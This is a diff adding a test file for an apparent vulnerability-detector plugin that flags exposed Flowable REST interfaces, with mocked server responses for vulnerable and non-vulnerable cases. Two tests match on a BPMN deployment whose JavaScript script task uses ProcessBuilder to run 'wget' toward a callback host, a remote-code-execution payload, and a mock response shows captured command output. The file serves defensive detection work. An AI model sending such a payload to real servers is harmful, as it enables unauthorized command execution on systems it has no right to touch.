@@ -1,0 +1,107 @@
+# proto-file: proto/templated_plugin_tests.proto
+# proto-message: TemplatedPluginTests
+
+config: {
+  tested_plugin: "Flowable_ExposedUI"
+}
+
+tests: {
+  name: "whenVulnerable_returnsVuln"
+  expect_vulnerability: true
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: true
+  }
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/flowable-rest/docs/"
+        status: 200
+        body_content:
+            'case "specfile/process/flowable-swagger-process.json":'
+              'case "specfile/dmn/flowable-swagger-decision.json":'
+      },
+      {
+        uri: "/flowable-rest/service/repository/deployments"
+        status: 201
+        body_content: '{"id":"15a2a09b-7833-11f0-be7c-d6c58d18e6b5","name":"jsScript","deploymentTime":"2025-08-13T10:48:45.013Z","category":null,"parentDeploymentId":"15a2a09b-7833-11f0-be7c-d6c58d18e6b5","url":"http://localhost:8081/flowable-rest/service/repository/deployments/15a2a09b-7833-11f0-be7c-d6c58d18e6b5","tenantId":""}'
+        condition: {
+          body_content: 'Content-Type: application/octet-stream\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"\nxmlns:flowable="http://flowable.org/bpmn"\ntargetNamespace="Examples">\n\n<process id="jsScriptProcess" name="JavaScript Script Process">\n<startEvent id="start" />\n<sequenceFlow sourceRef="start" targetRef="scriptTask" />\n<scriptTask id="scriptTask" name="Execute Command via JavaScript"\nscriptFormat="javascript"\nflowable:autoStoreVariables="true">\n<script>\nvar ProcessBuilder = Java.type(\'java.lang.ProcessBuilder\');\nvar Arrays = Java.type(\'java.util.Arrays\');\nvar Scanner = Java.type(\'java.util.Scanner\');\n\nvar processBuilder = new ProcessBuilder(Arrays.asList(\'wget\', \''
+        }
+      },
+      {
+        uri: "/flowable-rest/service/runtime/process-instances"
+        status: 201
+        body_content:
+            '{"id":"24aeb56e-7833-11f0-be7c-d6c58d18e6b5","url":"http://localhost:8081/flowable-rest/service/runtime/process-instances/24aeb56e-7833-11f0-be7c-d6c58d18e6b5","name":null,"businessKey":null,"businessStatus":null,"suspended":false,"ended":true,"processDefinitionId":"jsScriptProcess:2:15a4273d-7833-11f0-be7c-d6c58d18e6b5","processDefinitionUrl":"http://localhost:8081/flowable-rest/service/repository/process-definitions/jsScriptProcess:2:15a4273d-7833-11f0-be7c-d6c58d18e6b5","processDefinitionName":"JavaScript Script Process","processDefinitionDescription":null,"activityId":null,"startUserId":"rest-admin","startTime":"2025-08-13T10:49:10.258Z","superProcessInstanceId":null,"variables":[{"name":"commandOutput","type":"string","value":"Linux 32b589dc11ac 6.14.0-27-generic #27~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Jul 22 17:38:49 UTC 2 x86_64 Linux\n","scope":"local"}],"callbackId":null,"callbackType":null,"referenceId":null,"referenceType":null,"propagatedStageInstanceId":null,"tenantId":"","completed":true}'
+        condition: {
+          body_content: '{"processDefinitionKey": "jsScriptProcess"}'
+        }
+      },
+      {
+        uri: "/flowable-rest/service/repository/deployments/15a2a09b-7833-11f0-be7c-d6c58d18e6b5"
+        status: 201
+      }
+    ]
+  }
+}
+
+
+tests: {
+  name: "whenNotFlowable_returnsNoVuln"
+  expect_vulnerability: false
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri:  "/api/v1/main/usages/all"
+        status: 400
+        body_content: "..."
+      }
+    ]
+  }
+}
+
+tests: {
+  name: "whenNoCallback_returnsFalse"
+  expect_vulnerability: false
+
+  mock_callback_server: {
+    enabled: true
+    has_interaction: false
+  }
+
+  mock_http_server: {
+    mock_responses: [
+      {
+        uri: "/flowable-rest/docs/"
+        status: 200
+        body_content:
+            'case "specfile/process/flowable-swagger-process.json":'
+                'case "specfile/dmn/flowable-swagger-decision.json":'
+      },
+      {
+        uri: "/flowable-rest/service/repository/deployments"
+        status: 201
+        body_content: '{"id":"15a2a09b-7833-11f0-be7c-d6c58d18e6b5","name":"jsScript","deploymentTime":"2025-08-13T10:48:45.013Z","category":null,"parentDeploymentId":"15a2a09b-7833-11f0-be7c-d6c58d18e6b5","url":"http://localhost:8081/flowable-rest/service/repository/deployments/15a2a09b-7833-11f0-be7c-d6c58d18e6b5","tenantId":""}'
+        condition: {
+          body_content: 'Content-Type: application/octet-stream\r\n\r\n<?xml version="1.0" encoding="UTF-8"?>\n<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"\nxmlns:flowable="http://flowable.org/bpmn"\ntargetNamespace="Examples">\n\n<process id="jsScriptProcess" name="JavaScript Script Process">\n<startEvent id="start" />\n<sequenceFlow sourceRef="start" targetRef="scriptTask" />\n<scriptTask id="scriptTask" name="Execute Command via JavaScript"\nscriptFormat="javascript"\nflowable:autoStoreVariables="true">\n<script>\nvar ProcessBuilder = Java.type(\'java.lang.ProcessBuilder\');\nvar Arrays = Java.type(\'java.util.Arrays\');\nvar Scanner = Java.type(\'java.util.Scanner\');\n\nvar processBuilder = new ProcessBuilder(Arrays.asList(\'wget\', \''
+        }
+      },
+      {
+        uri: "/flowable-rest/service/runtime/process-instances"
+        status: 201
+        body_content:
+            '{"id":"24aeb56e-7833-11f0-be7c-d6c58d18e6b5","url":"http://localhost:8081/flowable-rest/service/runtime/process-instances/24aeb56e-7833-11f0-be7c-d6c58d18e6b5","name":null,"businessKey":null,"businessStatus":null,"suspended":false,"ended":true,"processDefinitionId":"jsScriptProcess:2:15a4273d-7833-11f0-be7c-d6c58d18e6b5","processDefinitionUrl":"http://localhost:8081/flowable-rest/service/repository/process-definitions/jsScriptProcess:2:15a4273d-7833-11f0-be7c-d6c58d18e6b5","processDefinitionName":"JavaScript Script Process","processDefinitionDescription":null,"activityId":null,"startUserId":"rest-admin","startTime":"2025-08-13T10:49:10.258Z","superProcessInstanceId":null,"variables":[{"name":"commandOutput","type":"string","value":"Linux 32b589dc11ac 6.14.0-27-generic #27~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue Jul 22 17:38:49 UTC 2 x86_64 Linux\n","scope":"local"}],"callbackId":null,"callbackType":null,"referenceId":null,"referenceType":null,"propagatedStageInstanceId":null,"tenantId":"","completed":true}'
+        condition: {
+          body_content: '{"processDefinitionKey": "jsScriptProcess"}'
+        }
+      },
+      {
+        uri: "/flowable-rest/service/repository/deployments/15a2a09b-7833-11f0-be7c-d6c58d18e6b5"
+        status: 201
+      }
+    ]
+  }
+}
